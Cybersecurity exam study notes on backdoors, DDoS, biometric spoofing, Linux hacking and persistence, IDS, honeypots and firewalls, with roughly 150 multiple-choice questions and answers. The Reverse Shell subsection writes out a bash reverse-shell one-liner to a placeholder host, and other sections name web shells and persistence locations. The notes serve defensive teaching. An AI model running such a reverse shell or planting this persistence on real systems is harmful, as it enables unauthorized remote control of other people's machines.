<!-- Theory:  Backdoor Devices
 Distributed Dos attacks
 Biometric Spoofing
 Linux Hacking
 Linux Backdoors
 IDSs, Honeypots and Firewalls

give notes covering all aspects dont skip any and 
include mcq exam tips  imp points and tips and tricks as well  -->



# Cyber Security Notes

# Backdoor Devices, Distributed DoS Attacks, Biometric Spoofing, Linux Hacking, Linux Backdoors, IDS, Honeypots and Firewalls

---

# 1. Backdoor Devices

## Definition

A **Backdoor** is a hidden method used to bypass normal authentication or security controls to gain unauthorized access to a system.

Backdoors may be:

* Hardware Backdoors
* Software Backdoors
* Firmware Backdoors
* Network Device Backdoors

---

## Types of Backdoor Devices

### 1. Hardware Backdoors

Inserted into:

* Routers
* Switches
* IoT Devices
* USB Devices
* Motherboards

Examples:

* Malicious USB
* Keyloggers
* Rogue Wireless Access Points

---

### 2. Software Backdoors

Hidden inside:

* Applications
* Operating Systems
* Malware

Examples:

* Trojan Horses
* Remote Access Trojans (RATs)
* Hidden Administrator Accounts

---

### 3. Firmware Backdoors

Embedded in:

* BIOS
* UEFI
* Network Device Firmware

Difficult to detect because they survive OS reinstallation.

---

### 4. Web Backdoors

Uploaded to web servers.

Examples:

```php
shell.php
cmd.php
webshell.php
```

Used for:

* Command Execution
* File Upload
* Database Access

---

## Common Backdoor Techniques

### Reverse Shell

Victim initiates connection to attacker.

Example:

```bash
bash -i >& /dev/tcp/IP/4444 0>&1
```

---

### RAT (Remote Access Trojan)

Provides:

* Remote Control
* File Access
* Webcam Access
* Keystroke Logging

Examples:

* DarkComet
* njRAT
* Poison Ivy

---

## Detection Methods

* Monitor unusual outbound connections
* Check startup services
* Verify system integrity
* Use IDS/IPS
* Endpoint Detection and Response (EDR)

---

## Prevention

* Patch systems
* Least privilege principle
* Network monitoring
* Disable unused services
* Application whitelisting

---

# Exam Points

Backdoor = Unauthorized hidden access.

Firmware backdoors are hardest to remove.

---

# 2. Distributed Denial of Service (DDoS) Attacks

## Definition

DDoS is an attack where multiple compromised devices flood a target with traffic causing service disruption.

---

## Terminology

### Attacker

Controls attack.

### Bot

Compromised device.

### Botnet

Collection of bots.

### Victim

Target server.

---

## DDoS Architecture

```text
Attacker
   |
Command Server
   |
Botnet
   |
Victim
```

---

## Types of DDoS Attacks

---

### 1. Volumetric Attacks

Consume bandwidth.

Examples:

* UDP Flood
* ICMP Flood

---

### 2. Protocol Attacks

Exploit network protocols.

Examples:

* SYN Flood
* Ping of Death
* Smurf Attack

---

### 3. Application Layer Attacks

Target web applications.

Examples:

* HTTP Flood
* Slowloris

---

## Famous DDoS Attack

### Mirai Botnet

Used compromised IoT devices.

Affected:

* DNS Providers
* Major Websites

---

## Effects

* Website downtime
* Revenue loss
* Reputation damage
* Service interruption

---

## Mitigation

* Load Balancers
* CDN
* Rate Limiting
* Web Application Firewall (WAF)
* Traffic Filtering

---

## Exam Tip

DoS = One attacker

DDoS = Many attackers

---

# 3. Biometric Spoofing

## Definition

Biometric Spoofing is the act of impersonating someone by faking biometric characteristics.

---

## Types of Biometrics

### Physiological

* Fingerprint
* Face
* Iris
* Retina
* Palm Print

### Behavioral

* Voice
* Signature
* Typing Pattern

---

## Biometric Spoofing Methods

### Fingerprint Spoofing

Fake fingerprints made using:

* Silicone
* Gelatin
* Latex

---

### Face Spoofing

Using:

* Printed Photos
* Videos
* Deepfakes
* 3D Masks

---

### Voice Spoofing

Using:

* Voice Recording
* AI Voice Cloning

---

### Iris Spoofing

Using:

* High Resolution Images
* Contact Lenses

---

## Risks

* Unauthorized Access
* Identity Theft
* Financial Fraud

---

## Countermeasures

### Liveness Detection

Checks:

* Blinking
* Eye Movement
* Pulse

---

### Multi-Factor Authentication

Biometric + Password

---

### AI-Based Detection

Detects fake biometrics.

---

## Exam Point

Liveness Detection is the primary defense against biometric spoofing.

---

# 4. Linux Hacking

## Definition

Linux hacking refers to identifying vulnerabilities and exploiting weaknesses in Linux systems.

Can be:

* Ethical
* Malicious

---

## Linux Security Features

* User Permissions
* SELinux
* AppArmor
* Firewall
* SSH Authentication

---

## Common Linux Attack Vectors

### Weak Passwords

Example:

```bash
ssh root@server
```

---

### Misconfigured Services

Examples:

* FTP
* Telnet
* Samba

---

### Outdated Software

Vulnerable packages can be exploited.

---

### Privilege Escalation

Normal user becomes root.

---

## Enumeration

Gathering information.

Commands:

```bash
uname -a
id
whoami
hostname
ifconfig
ip a
netstat
ss
```

---

## Log Files

Important logs:

```bash
/var/log/auth.log
/var/log/syslog
/var/log/messages
```

---

## Linux Hardening

* Disable root login
* Enable firewall
* Use SSH keys
* Update packages
* Audit logs

---

# Exam Point

Enumeration is the first phase after gaining access.

---

# 5. Linux Backdoors

## Definition

Linux backdoor allows persistent unauthorized access.

---

## Types

### SSH Backdoor

Unauthorized SSH key added.

Example:

```bash
~/.ssh/authorized_keys
```

---

### Cron Backdoor

Scheduled malicious task.

Example:

```bash
crontab -e
```

---

### Service Backdoor

Malicious service starts at boot.

---

### Rootkit

Stealth malware hiding processes and files.

Examples:

* Diamorphine
* Adore-ng

---

## Persistence Mechanisms

### Startup Scripts

```bash
/etc/rc.local
```

---

### Systemd Services

```bash
/etc/systemd/system
```

---

### Cron Jobs

```bash
/etc/crontab
```

---

## Detection

Check:

```bash
systemctl list-units
crontab -l
netstat -tulpn
ss -tulpn
```

---

## Prevention

* File integrity monitoring
* Rootkit scanners
* Log auditing
* SSH key auditing

---

# Exam Point

Rootkit = Hides malware activity from users and administrators.

---

# 6. Intrusion Detection Systems (IDS)

## Definition

IDS monitors network or host activity and alerts administrators about suspicious behavior.

---

## Types

### Host Based IDS (HIDS)

Monitors:

* Files
* Logs
* Processes

Examples:

* OSSEC
* Wazuh

---

### Network Based IDS (NIDS)

Monitors:

* Network Traffic

Examples:

* Snort
* Suricata

---

## Detection Methods

### Signature Based

Matches known attack patterns.

Advantage:

* Accurate

Disadvantage:

* Cannot detect unknown attacks

---

### Anomaly Based

Detects abnormal behavior.

Advantage:

* Detects unknown attacks

Disadvantage:

* False positives

---

## IDS Workflow

```text
Traffic
   ↓
IDS Sensor
   ↓
Analysis Engine
   ↓
Alert
```

---

## Exam Point

IDS Detects

IPS Prevents

---

# 7. Honeypots

## Definition

A Honeypot is a decoy system designed to attract attackers.

---

## Objectives

* Detect attacks
* Study attacker behavior
* Gather intelligence

---

## Types

### Low Interaction Honeypot

Simulates limited services.

Examples:

* Honeyd

---

### High Interaction Honeypot

Real operating system.

Provides detailed information.

---

## Benefits

* Early warning
* Threat intelligence
* Malware collection

---

## Risks

* Honeypot may be compromised
* Requires monitoring

---

## Exam Point

Honeypot = Trap for attackers.

---

# 8. Firewalls

## Definition

Firewall is a security device/software that filters incoming and outgoing traffic.

---

## Types

### Packet Filtering Firewall

Checks:

* IP Address
* Port Number
* Protocol

---

### Stateful Firewall

Tracks connection state.

More secure.

---

### Proxy Firewall

Acts as intermediary.

---

### Next Generation Firewall (NGFW)

Provides:

* Deep Packet Inspection
* Application Control
* Intrusion Prevention

---

## Firewall Actions

### Allow

Traffic permitted.

### Deny

Traffic blocked.

### Reject

Traffic blocked and sender informed.

---

## Firewall Deployment

### Network Firewall

Protects entire network.

### Host Firewall

Protects individual system.

Examples:

* Windows Firewall
* UFW
* iptables

---

## Firewall Limitations

* Cannot stop insider threats
* Cannot stop social engineering
* Cannot stop all malware

---

# Quick Comparison Table

| Technology         | Purpose                   |
| ------------------ | ------------------------- |
| Firewall           | Filter Traffic            |
| IDS                | Detect Attacks            |
| IPS                | Prevent Attacks           |
| Honeypot           | Attract Attackers         |
| Backdoor           | Hidden Access             |
| Rootkit            | Hide Malicious Activity   |
| DDoS               | Disrupt Services          |
| Biometric Spoofing | Bypass Biometric Security |

---

# Frequently Asked Exam Questions

### Q1. Difference between DoS and DDoS?

DoS uses one attacking system.

DDoS uses multiple attacking systems.

---

### Q2. What is a Rootkit?

Malware that hides files, processes and network connections.

---

### Q3. Difference between IDS and IPS?

IDS detects attacks.

IPS detects and blocks attacks.

---

### Q4. What is a Honeypot?

A decoy system used to lure attackers.

---

### Q5. What is Biometric Spoofing?

Creating fake biometric data to bypass authentication.

---

# 50 MCQs

### 1. A hidden method of bypassing authentication is called:

A) Firewall
B) Backdoor
C) Honeypot
D) IDS

**Answer: B**

---

### 2. A collection of compromised systems used in DDoS is:

A) LAN
B) Botnet
C) VPN
D) VLAN

**Answer: B**

---

### 3. Mirai primarily targeted:

A) Databases
B) IoT Devices
C) Mobile Phones
D) DNS only

**Answer: B**

---

### 4. Which attack floods TCP connection requests?

A) SYN Flood
B) Smurf
C) XSS
D) SQLi

**Answer: A**

---

### 5. Fake fingerprints are used in:

A) DDoS
B) Biometric Spoofing
C) Phishing
D) Sniffing

**Answer: B**

---

### 6. Liveness detection helps prevent:

A) SQL Injection
B) DDoS
C) Biometric Spoofing
D) Session Hijacking

**Answer: C**

---

### 7. Which Linux file stores SSH authorized keys?

A) passwd
B) shadow
C) authorized_keys
D) hosts

**Answer: C**

---

### 8. A rootkit primarily:

A) Encrypts files
B) Hides malicious activity
C) Detects attacks
D) Filters traffic

**Answer: B**

---

### 9. Snort is an example of:

A) Firewall
B) NIDS
C) VPN
D) Rootkit

**Answer: B**

---

### 10. Wazuh is:

A) HIDS
B) Firewall
C) RAT
D) Honeypot

**Answer: A**

---

### 11. IDS stands for?

A) Intrusion Detection System
B) Internet Data Service
C) Internal Detection Server
D) Intrusion Defense Service

**Answer: A**

---

### 12. Honeypot is mainly used to:

A) Encrypt Data
B) Attract Attackers
C) Route Packets
D) Compress Files

**Answer: B**

---

### 13. NGFW stands for:

A) Next Generation Firewall
B) New Gateway Firewall
C) Network Gateway Filter
D) None

**Answer: A**

---

### 14. Which firewall tracks connection state?

A) Packet Filtering
B) Stateful
C) Proxy only
D) Static

**Answer: B**

---

### 15. SSH commonly runs on port:

A) 80
B) 22
C) 443
D) 21

**Answer: B**

---

### 16-50 Important One-Liners

16. IDS generates alerts → True
17. IPS blocks attacks → True
18. Honeypot is a decoy → True
19. RAT means Remote Access Trojan → True
20. Mirai created a botnet → True
21. Firmware backdoors survive OS reinstall → True
22. SSH key abuse is a Linux backdoor → True
23. Cron can provide persistence → True
24. Web shell is a backdoor → True
25. Signature IDS detects known attacks → True
26. Anomaly IDS detects unknown attacks → True
27. DDoS impacts availability → True
28. Biometric spoofing targets authentication → True
29. Rootkits hide processes → True
30. Packet filtering checks ports → True
31. NGFW supports DPI → True
32. Firewall cannot stop social engineering → True
33. Honeypots gather threat intelligence → True
34. Botnet consists of bots → True
35. Reverse shell connects back to attacker → True
36. SSH is encrypted → True
37. Linux logs help forensic analysis → True
38. Honeypot may be compromised → True
39. WAF helps against HTTP floods → True
40. DDoS uses multiple systems → True
41. Backdoor bypasses authentication → True
42. HIDS runs on host → True
43. NIDS monitors network → True
44. Stateful firewall remembers sessions → True
45. Rootkits are stealthy malware → True
46. Liveness detection checks real users → True
47. Application layer attacks target web apps → True
48. IoT devices are common botnet targets → True
49. UFW is a Linux firewall → True
50. Defense in depth improves security → True

---

# Last-Minute Exam Revision (Must Remember)

✅ Backdoor = Hidden Access
✅ RAT = Remote Control Malware
✅ Botnet = Collection of Bots
✅ Mirai = IoT DDoS Botnet
✅ DDoS = Availability Attack
✅ Liveness Detection = Anti-Spoofing
✅ Enumeration = First Linux Hacking Step
✅ Rootkit = Hides Malware
✅ HIDS = Host Monitoring
✅ NIDS = Network Monitoring
✅ Honeypot = Decoy System
✅ Firewall = Traffic Filtering
✅ IDS Detects, IPS Prevents
✅ NGFW = Deep Packet Inspection + IPS + App Control
✅ Cron Jobs, SSH Keys, Systemd = Common Linux Persistence Mechanisms


# 100 MCQs – Backdoor Devices, DDoS, Biometric Spoofing, Linux Hacking, Linux Backdoors, IDS, Honeypots & Firewalls

## Backdoor Devices MCQs

### 1. A backdoor is:

A) Encryption method
B) Hidden access mechanism
C) Firewall rule
D) Authentication protocol

**Answer: B**

---

### 2. Which malware commonly creates backdoors?

A) Worm
B) Trojan
C) Antivirus
D) IDS

**Answer: B**

---

### 3. A backdoor primarily affects:

A) Availability
B) Confidentiality
C) Authentication
D) Integrity

**Answer: C**

---

### 4. Firmware backdoors are difficult to remove because they reside in:

A) RAM
B) Browser
C) Firmware
D) Cookies

**Answer: C**

---

### 5. A web shell is an example of:

A) Firewall
B) Backdoor
C) IDS
D) Honeypot

**Answer: B**

---

### 6. RAT stands for:

A) Remote Access Trojan
B) Remote Attack Tool
C) Routing Access Tool
D) Remote Audit Trojan

**Answer: A**

---

### 7. Which is a common backdoor technique?

A) Reverse Shell
B) DHCP
C) ARP
D) FTP

**Answer: A**

---

### 8. Hardware backdoors may be inserted into:

A) Routers
B) Switches
C) IoT Devices
D) All of the above

**Answer: D**

---

### 9. Backdoors often bypass:

A) Authentication
B) Routing
C) DNS
D) Encryption

**Answer: A**

---

### 10. Which is NOT a backdoor?

A) Web Shell
B) RAT
C) Firewall
D) Hidden Admin Account

**Answer: C**

---

## DDoS MCQs

### 11. DDoS stands for:

A) Distributed Denial of Service
B) Direct Denial of Service
C) Data Denial System
D) Distributed Data Service

**Answer: A**

---

### 12. A compromised device in a botnet is called:

A) Zombie
B) Router
C) Proxy
D) Gateway

**Answer: A**

---

### 13. A botnet is:

A) Security Tool
B) Group of Bots
C) Firewall
D) Honeypot

**Answer: B**

---

### 14. Which attack consumes bandwidth?

A) SQL Injection
B) UDP Flood
C) XSS
D) CSRF

**Answer: B**

---

### 15. SYN Flood is a:

A) Application Attack
B) Protocol Attack
C) Physical Attack
D) Password Attack

**Answer: B**

---

### 16. HTTP Flood targets:

A) Transport Layer
B) Application Layer
C) Data Link Layer
D) Physical Layer

**Answer: B**

---

### 17. Mirai Botnet mainly infected:

A) Databases
B) IoT Devices
C) Smartphones Only
D) Firewalls

**Answer: B**

---

### 18. DDoS primarily affects:

A) Availability
B) Integrity
C) Confidentiality
D) Authentication

**Answer: A**

---

### 19. Slowloris is:

A) Malware
B) Application Layer DDoS
C) Firewall
D) IDS

**Answer: B**

---

### 20. Which helps mitigate DDoS?

A) CDN
B) Load Balancer
C) Rate Limiting
D) All of the above

**Answer: D**

---

### 21. DoS involves:

A) One Attacker
B) Multiple Attackers
C) Honeypots
D) IDS

**Answer: A**

---

### 22. DDoS uses:

A) Single Host
B) Multiple Systems
C) VPN Only
D) Proxy Only

**Answer: B**

---

### 23. ICMP Flood is a:

A) Volumetric Attack
B) Password Attack
C) SQLi
D) Malware

**Answer: A**

---

### 24. Smurf Attack exploits:

A) ICMP
B) HTTP
C) SMTP
D) SSH

**Answer: A**

---

### 25. Botnets are controlled through:

A) Command and Control Server
B) Firewall
C) DNS Only
D) Honeypot

**Answer: A**

---

## Biometric Spoofing MCQs

### 26. Biometric spoofing attempts to:

A) Block Network
B) Fake Identity
C) Encrypt Data
D) Route Packets

**Answer: B**

---

### 27. Fingerprint spoofing may use:

A) Silicone
B) Gelatin
C) Latex
D) All of the above

**Answer: D**

---

### 28. Deepfakes are associated with:

A) Face Spoofing
B) Firewall
C) IDS
D) SSH

**Answer: A**

---

### 29. Voice cloning is an example of:

A) Voice Spoofing
B) Encryption
C) Routing
D) Sniffing

**Answer: A**

---

### 30. Liveness Detection checks:

A) Password
B) Real Human Presence
C) Encryption
D) Routing

**Answer: B**

---

### 31. Which is a physiological biometric?

A) Signature
B) Typing Pattern
C) Fingerprint
D) Voice Rhythm

**Answer: C**

---

### 32. Which is a behavioral biometric?

A) Retina
B) Iris
C) Typing Pattern
D) Fingerprint

**Answer: C**

---

### 33. Best protection against biometric spoofing:

A) MFA
B) Liveness Detection
C) AI Detection
D) All of the Above

**Answer: D**

---

### 34. Fake contact lenses may be used for:

A) Voice Spoofing
B) Iris Spoofing
C) DDoS
D) Sniffing

**Answer: B**

---

### 35. Biometric spoofing can result in:

A) Identity Theft
B) Unauthorized Access
C) Fraud
D) All of the Above

**Answer: D**

---

## Linux Hacking MCQs

### 36. Linux privilege escalation aims to obtain:

A) Guest Access
B) Root Access
C) DNS Access
D) VPN Access

**Answer: B**

---

### 37. First phase after access is:

A) Enumeration
B) Exploitation
C) Exfiltration
D) Encryption

**Answer: A**

---

### 38. Command to display current user:

A) ls
B) whoami
C) pwd
D) cat

**Answer: B**

---

### 39. Command showing Linux kernel version:

A) uname -a
B) ls
C) cd
D) pwd

**Answer: A**

---

### 40. Weak passwords lead to:

A) Unauthorized Access
B) Better Security
C) Faster Routing
D) Encryption

**Answer: A**

---

### 41. Telnet is considered insecure because:

A) Unencrypted
B) Too Fast
C) Uses SSH
D) Uses TLS

**Answer: A**

---

### 42. SSH default port:

A) 21
B) 22
C) 23
D) 80

**Answer: B**

---

### 43. Which file stores user information?

A) /etc/passwd
B) boot.ini
C) config.sys
D) ntuser.dat

**Answer: A**

---

### 44. SELinux is:

A) Security Mechanism
B) Browser
C) IDS
D) Router

**Answer: A**

---

### 45. AppArmor is:

A) Linux Security Module
B) Malware
C) Firewall Hardware
D) Proxy

**Answer: A**

---

### 46. Linux logs help in:

A) Forensics
B) Auditing
C) Incident Investigation
D) All of the Above

**Answer: D**

---

### 47. Which service should be disabled if unused?

A) Telnet
B) FTP
C) rlogin
D) All of the Above

**Answer: D**

---

### 48. Hardening includes:

A) Updates
B) Firewall
C) Strong Authentication
D) All

**Answer: D**

---

### 49. Principle of Least Privilege means:

A) Maximum Access
B) Minimum Required Access
C) Anonymous Access
D) Guest Access

**Answer: B**

---

### 50. Root account is:

A) Guest User
B) Superuser
C) Normal User
D) Anonymous User

**Answer: B**

---

## Linux Backdoor MCQs

### 51. SSH backdoor commonly abuses:

A) authorized_keys
B) passwd
C) hosts
D) group

**Answer: A**

---

### 52. Cron jobs can provide:

A) Persistence
B) Encryption
C) Routing
D) Scanning

**Answer: A**

---

### 53. Rootkits are designed to:

A) Hide Activity
B) Encrypt Traffic
C) Route Packets
D) Detect Malware

**Answer: A**

---

### 54. Systemd services may be used for:

A) Persistence
B) Routing
C) DNS
D) VLAN

**Answer: A**

---

### 55. Rootkit detection tool category:

A) Anti-rootkit
B) VPN
C) DHCP
D) SMTP

**Answer: A**

---

### 56. Linux backdoors commonly seek:

A) Persistent Access
B) Routing
C) DNS Resolution
D) VLAN Management

**Answer: A**

---

### 57. Unauthorized SSH keys can:

A) Create Backdoors
B) Improve Security
C) Encrypt Traffic
D) Stop Malware

**Answer: A**

---

### 58. Service-based backdoor starts:

A) On Boot
B) During Shutdown Only
C) During Login Only
D) Never

**Answer: A**

---

### 59. Cron configuration is managed by:

A) crontab
B) ssh
C) ftp
D) ping

**Answer: A**

---

### 60. Rootkits commonly target:

A) Kernel
B) User Space
C) Both
D) Neither

**Answer: C**

---

## IDS MCQs

### 61. IDS stands for:

A) Intrusion Detection System
B) Internet Data Service
C) Internal Detection Server
D) Intrusion Defense Service

**Answer: A**

---

### 62. HIDS monitors:

A) Hosts
B) Routers
C) Internet
D) DNS

**Answer: A**

---

### 63. NIDS monitors:

A) Network Traffic
B) BIOS
C) Firmware
D) Hardware Only

**Answer: A**

---

### 64. Snort is:

A) NIDS
B) Firewall
C) Antivirus
D) VPN

**Answer: A**

---

### 65. Wazuh is:

A) HIDS
B) Router
C) Proxy
D) Firewall

**Answer: A**

---

### 66. Signature-based IDS detects:

A) Known Attacks
B) Unknown Only
C) Passwords
D) Routers

**Answer: A**

---

### 67. Anomaly-based IDS detects:

A) Abnormal Behavior
B) Signatures Only
C) Routing
D) VLANs

**Answer: A**

---

### 68. Main drawback of anomaly detection:

A) False Positives
B) No Detection
C) Encryption
D) Routing

**Answer: A**

---

### 69. IDS primarily:

A) Detects
B) Blocks
C) Encrypts
D) Routes

**Answer: A**

---

### 70. IPS primarily:

A) Prevents
B) Logs Only
C) Routes
D) Encrypts

**Answer: A**

---

## Honeypot MCQs

### 71. Honeypot is:

A) Decoy System
B) Firewall
C) IDS
D) Router

**Answer: A**

---

### 72. Main purpose of a honeypot:

A) Attract Attackers
B) Encrypt Files
C) Route Traffic
D) Authenticate Users

**Answer: A**

---

### 73. Honeyd is:

A) Honeypot
B) Firewall
C) Browser
D) Proxy

**Answer: A**

---

### 74. High-interaction honeypots:

A) Simulate Limited Services
B) Use Real Systems
C) Block Traffic
D) Detect Malware Only

**Answer: B**

---

### 75. Low-interaction honeypots:

A) Fully Functional OS
B) Limited Simulation
C) Firewall
D) VPN

**Answer: B**

---

### 76. Honeypots provide:

A) Threat Intelligence
B) Attack Analysis
C) Early Warning
D) All

**Answer: D**

---

### 77. Honeypots are generally isolated because:

A) They May Be Compromised
B) Faster Network
C) Better Encryption
D) Easier Routing

**Answer: A**

---

### 78. Honeypots help study:

A) Attacker Behavior
B) Password Creation
C) Routing
D) DHCP

**Answer: A**

---

### 79. Honeynet is:

A) Network of Honeypots
B) Firewall
C) VPN
D) IDS

**Answer: A**

---

### 80. Honeypots are examples of:

A) Deception Technology
B) Encryption
C) Routing
D) Switching

**Answer: A**

---

## Firewall MCQs

### 81. Firewall primarily:

A) Filters Traffic
B) Encrypts Files
C) Creates Users
D) Routes DNS

**Answer: A**

---

### 82. Packet Filtering Firewall checks:

A) IP Address
B) Port
C) Protocol
D) All

**Answer: D**

---

### 83. Stateful Firewall tracks:

A) Connection State
B) Passwords
C) DNS Records
D) VLANs

**Answer: A**

---

### 84. Proxy Firewall acts as:

A) Intermediary
B) Router
C) Switch
D) IDS

**Answer: A**

---

### 85. NGFW stands for:

A) Next Generation Firewall
B) New Gateway Firewall
C) Network Global Firewall
D) None

**Answer: A**

---

### 86. NGFW includes:

A) DPI
B) IPS
C) Application Control
D) All

**Answer: D**

---

### 87. UFW is:

A) Linux Firewall
B) IDS
C) Honeypot
D) Router

**Answer: A**

---

### 88. iptables is:

A) Linux Firewall Tool
B) Antivirus
C) Browser
D) Proxy

**Answer: A**

---

### 89. Host Firewall protects:

A) Individual Machine
B) Entire Internet
C) DNS
D) ISP

**Answer: A**

---

### 90. Network Firewall protects:

A) Entire Network
B) Single File
C) Browser
D) DNS

**Answer: A**

---

## Mixed Important MCQs

### 91. IDS + Firewall together provide:

A) Detection and Filtering
B) Routing
C) DNS
D) Switching

**Answer: A**

---

### 92. Which attack targets availability?

A) DDoS
B) SQLi
C) XSS
D) CSRF

**Answer: A**

---

### 93. Which technology is a trap for attackers?

A) Honeypot
B) VPN
C) DHCP
D) SMTP

**Answer: A**

---

### 94. Which malware hides itself?

A) Rootkit
B) Browser
C) DNS
D) Proxy

**Answer: A**

---

### 95. Which provides hidden unauthorized access?

A) Backdoor
B) Firewall
C) IDS
D) VPN

**Answer: A**

---

### 96. Best defense against biometric spoofing:

A) Liveness Detection
B) Open Access
C) Telnet
D) Anonymous Login

**Answer: A**

---

### 97. Which tool monitors network packets for attacks?

A) NIDS
B) Cron
C) SSH
D) FTP

**Answer: A**

---

### 98. Mirai became famous for:

A) DDoS Attacks
B) Encryption
C) Routing
D) DHCP

**Answer: A**

---

### 99. Which security control prevents unauthorized traffic?

A) Firewall
B) Honeypot
C) Rootkit
D) RAT

**Answer: A**

---

### 100. Defense in Depth means:

A) Multiple Security Layers
B) One Firewall Only
C) One Password Only
D) No Monitoring

**Answer: A**

# Most Important Exam Questions (Very Frequently Asked)

1. Difference between DoS and DDoS.
2. What is a Backdoor? Types of Backdoors.
3. Explain Reverse Shell and RAT.
4. What is Mirai Botnet?
5. Explain Biometric Spoofing and Liveness Detection.
6. Linux Enumeration Commands.
7. What is a Rootkit?
8. Linux Persistence Mechanisms (Cron, SSH Keys, Systemd).
9. Difference between HIDS and NIDS.
10. Signature-based vs Anomaly-based IDS.
11. IDS vs IPS.
12. Low Interaction vs High Interaction Honeypot.
13. Types of Firewalls.
14. Stateful Firewall vs Packet Filtering Firewall.
15. NGFW Features.
16. Firewall Limitations.
17. Honeypot Advantages and Risks.
18. DDoS Mitigation Techniques.
19. SSH Backdoor and Detection.
20. Defense in Depth Concept.

### 1-Mark Revision Formula

* Backdoor = Hidden Access
* RAT = Remote Access Trojan
* Botnet = Collection of Bots
* Mirai = IoT DDoS Botnet
* DDoS = Availability Attack
* Rootkit = Hides Malware
* HIDS = Host Monitoring
* NIDS = Network Monitoring
* IDS = Detect
* IPS = Detect + Block
* Honeypot = Decoy System
* NGFW = DPI + IPS + App Control
* Liveness Detection = Anti-Spoofing
* Cron + SSH Keys + Systemd = Linux Persistence
* Firewall = Traffic Filtering